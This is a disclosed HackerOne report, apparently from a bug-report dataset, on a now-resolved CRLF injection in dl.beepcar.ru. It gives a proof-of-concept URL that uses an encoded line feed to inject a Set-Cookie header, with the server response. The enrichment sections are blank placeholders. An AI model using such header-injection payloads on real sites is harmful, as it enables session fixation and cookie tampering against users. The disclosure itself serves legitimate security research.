---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '332708'
original_report_id: '332708'
title: '[dl.beepcar.ru] CRLF Injection'
team_handle: mailru
created_at: '2018-04-03T19:26:20.544Z'
disclosed_at: '2018-05-22T15:10:54.072Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: Another project / domain acquired by Mail.Ru
asset_type: OTHER
max_severity: critical
tags:
- hackerone
---

# [dl.beepcar.ru] CRLF Injection

## Metadata

- HackerOne Report ID: 332708
- Weakness: 
- Program: mailru
- Disclosed At: 2018-05-22T15:10:54.072Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

CRLF Injection via Get request

PoC:
```
https://dl.beepcar.ru/qwerty%0ASet-Cookie:%20test=qwerty;domain=.beepcar.ru
```

HTTP Response:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.12.2
Date: Tue, 03 Apr 2018 19:20:31 GMT
Content-Type: text/html
Content-Length: 161
Connection: close
Location: https://beepcar.ru/qwerty
Set-Cookie: test=qwerty;domain=.beepcar.ru

<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.12.2</center>
</body>
</html>

```

## Impact

Result:
Creating a cookie-param "test=qwerty" on *.beepcar.ru

CSRF-bypass
session-fixation 
XSS via cookie values

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
